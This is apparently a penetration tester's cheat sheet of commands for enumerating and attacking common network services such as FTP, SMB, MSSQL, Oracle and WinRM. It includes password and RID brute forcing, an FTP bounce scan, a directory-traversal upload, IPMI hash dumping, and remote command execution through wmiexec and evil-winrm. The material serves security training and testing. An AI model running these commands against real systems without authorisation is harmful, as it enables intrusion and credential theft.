# Attacking Common Services

### Getting IPs of web servers
```shell
for i in $(cat subdomainlist);do host $i | grep "has address" | grep $DOMAIN | cut -d" " -f1,4;donev
```

### Server info using Shodan
```shell
for i in $(cat ip-addresses.txt);do shodan host $i;done
```

## FTP

- File Tranfer Protocol, uses TCP Port `21`
- Application layer of the TCP/IP protocol stack
- It is a Clear text protocol and data can be sniffed.
- Trivial File Transfer Protocol (TFTP) is simpler than FTP and performs file transfers between
client and server processes. It does not provide user authentication and other features supported by FTP.
- Dangerous settings include: anonymous login, file upload, create directory, usage of commands
like `STOR, DELE, RNFR, RNTO, MKD, RMD, APPE, and SITE`

```shell
# Download a file
get filename
# Download all available files
wget -m --no-passive ftp://anonymous:anonymous@$IP
# Upload file
put local_filename
# When service is using SSL/TLS
openssl s_client -connect $TARGET_IP:21 -starttls ftp
```

- Attacking FTP:

```shell
# Using nmap scripts
sudo nmap -sC -sV -p 21 $TARGET_IP
# Password brute forcing
medusa -u $USERNAME -P $PASSWORD_FILE -h $IP -M ftp
# FTP Bounce Attack
# An FTP bounce attack is a network attack that uses FTP servers
# to deliver outbound traffic to another device on the network. 
# The attacker uses a PORT command to trick the FTP connection 
# into running commands and getting information from a device
# other than the intended server.
nmap -Pn -v -n -p80 -b anonymous:password@$TARGET_IP $INTERNAL_IP
# FTP directory traversal vulnerability
curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
```


## SSH

```shell
# Footprinting the service
./ssh-audit.py $TARGET_IP

# Try changing authentication method
ssh -v $USERNAME@$TARGET_IP -o PreferredAuthentications=password
```


## SMB

- Server Message Block, uses TCP.
- A client-server protocol that regulates access to files and entire directories and other network resources.
- Access rights are defined by ACLs.
- The ACLs are defined based on the shares and do not correspond to the rights assigned locally on the server.


- Samba implements the Common Internet File System (CIFS) network protocol.
- CIFS is a specific version of SMB.
- When SMB commands are transmitted over Samba to an older NetBIOS service,
connection occur over TCP ports `137, 138, and 139`.
- CIFS operates over TCP port `445` exclusively.
- Dangerous settings include: allow guest to connect, insecure default permissions of files,
logon script, magic script etc

```shell
# Accessing shares using null credentials
smbclient -N -L //$TARGET_IP
crackmapexec smb $TARGET_IP -u '' -p '' --shares
netexec smb $TARGET_IP -u '' -p '' -M spider_plus
smbmap -H $TARGET_IP

# Getting data from the shares
netexec smb $TARGET_IP -u $USER -p $PASS --shares --filter-shares READ WRITE
netexec smb $TARGET_IP -u $USER -p $PASS -M spider_plus

# Enumerating using enum4linux
enum4linux-ng.py $TARGET_IP -A  

# Downloading files
smbmap -H $TARGET_IP -u $USER -p $PASS --download $FILE_PATH
```

```shell
# Enumerating using rpcclient
rpcclient -U "" $TARGET_IP
rpcclient $> srvinfo
rpcclient $> enumdomains
rpcclient $> enumdomusers
rpcclient $> queryuser $RID
rpcclient $> querygroup $GID
rpcclient $> querydominfo
rpcclient $> netshareenumall
rpcclient $> netshareenumall $SHARENAME
```

- Attacking SMB:

```shell
# Using nmap scripts
sudo nmap $TARGET_IP -sV -sC -p139,445
nmap --script smb-vuln* -p 139,445 $TARGET_IP
# RID Brute forcing
samrdump.py $DOMAIN/$USER:$PASSWORD@$TARGET_IP
lookupsid.py guest@$TARGET_IP -no-pass
netexec smb $TARGET_IP -u guest -p '' --rid-brute
```


## NFS

```shell
# Footprinting using nmap
sudo nmap $TARGET_IP -p111,2049 --script nfs* -sV -sC

# List available shares
showmount -e $TARGET_IP

# Mount NFS share
mkdir mnt
sudo mount -t nfs $TARGET_IP:/ ./mnt/ -o nolock

# Unmount share
sudo umount ./mnt
```

## DNS

```shell
# NS Query
dig ns $WEBSITE @$DNS_SERVER

# All available records
dig any $WEBSITE @$DNS_SERVER

# Zone transfer
dig axfr $WEBSITE @$DNS_SERVER
dig axfr $SUBDOMAIN.$WEBSITE @$DNS_SERVER
```

> If the administrator used a subnet for the allow-transfer option for testing purposes or as a workaround solution or set it to any, everyone would query the entire zone file at the DNS server. In addition, other zones can be queried, which may even show internal IP addresses and hostnames.


## SMTP

```shell
# Footprinting service
sudo nmap $TARGET_IP -sC -sV -p25

# Open relay testing
sudo nmap $TARGET_IP -p25 --script smtp-open-relay -v
```

## IMAP/POP3

```shell
# Footprinting
sudo nmap $TARGET_IP -sV -p110,143,993,995 -sC

# Connecting to IMAP using curl
curl -k 'imaps://$TARGET_IP' --user user:password -v

# Connecting to TLS encrypted POP3 and IMAP
openssl s_client -connect $TARGET_IP:pop3s
openssl s_client -connect $TARGET_IP:imaps
```

## SNMP

```shell
# Fingerprinting
snmpwalk -v2c -c public $TARGET_IP
onesixtyone -c seclists/Discovery/SNMP/snmp.txt $TARGET_IP
braa $community_string@$TARGET_IP:.1.3.6.* 
```

## MySQL

```shell
# Footprinting
sudo nmap $TARGET_IP -sV -sC -p3306 --script mysql*

# Connecting to service
mysql -u user -pPassword -h $TARGET_IP

# Simple commands
- show databases;
- show tables;
- select * from tables;
```

## MSSQL

```shell
# Footprinting
sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 $TARGET_IP

# Footprinting using MSSQL Ping
msf6 auxiliary(scanner/mssql/mssql_ping) > set rhosts $TARGET_IP

# Connecting to service
impacket-mssqlclient $USERNAME@$TARGET_IP
impacket-mssqlclient $USERNAME@$TARGET_IP -windows-auth
```

## Oracle TNS

```shell
# Footprinting
sudo nmap -p1521 -sV $TARGET_IP --open

# SID Bruteforcing
sudo nmap -p1521 -sV $TARGET_IP --open --script oracle-sid-brute

# Enumerating the service
odat.py all -s $TARGET_IP

# If we have creds, login to the service
sqlplus $USER/$PASSWORD@$TARGET_IP/XE
sqlplus $USER/$PASSWORD@$TARGET_IP/XE as sysdba

# File Upload
odat.py utlfile -s $TARGET_IP -d XE -U $USERNAME -P $PASSWORD --sysdba --putFile $DESTINATION $SOURCE

# Simple queries
- select table_name from all_tables;
- select * from table_name;
```

## IPMI

```shell
# Footprinting
sudo nmap -sU --script ipmi-version -p 623 $TARGET_IP

# MSF module
msf6 > use auxiliary/scanner/ipmi/ipmi_version 

# RAKP remote SHA1 password hash retrieval
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
```

## Rsync - Linux

```shell
# Footprinting
sudo nmap -sV -p 873 $TARGET_IP

# Checking accessible shares
nc -nv $TARGET_IP 873

# Enumerating open shares
rsync -av --list-only rsync://$TARGET_IP/$SHARENAME
```

## R-Services - Linux

```shell
# Footprinting
sudo nmap -sV -p 512,513,514 10.0.17.2

# Login using rlogin
rlogin $TARGET_IP -l $USERNAME
# Once logged in, abuse rwho to list interactive sessions
# and rusers to get authenticated users
rwho
rusers -al $TARGET_IP
```

## RDP - Windows

```shell
# Footprinting
nmap -sV -sC $TARGET_IP -p3389 --script rdp*
# Avoiding detection while footprinting
nmap -sV -sC $TARGET_IP -p3389 --packet-trace --disable-arp-ping -n

# Checking RDP security
# git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git && cd rdp-sec-check
./rdp-sec-check.pl $TARGET_IP
```

## WinRM - Windows

```shell
# Footprinting
nmap -sV -sC $TARGET_IP -p5985,5986 --disable-arp-ping -n

# Connect to the service
evil-winrm -i $TARGET_IP -u $USERNAME -p $PASSWORD
```

## WMI - Windows

```shell
# Footprinting
nmap -sV -sC $TARGET_IP -p135 --disable-arp-ping -n

# Connect to the service
impacket-wmiexec $USERNAME:$PASSWORD@$TARGET_IP
```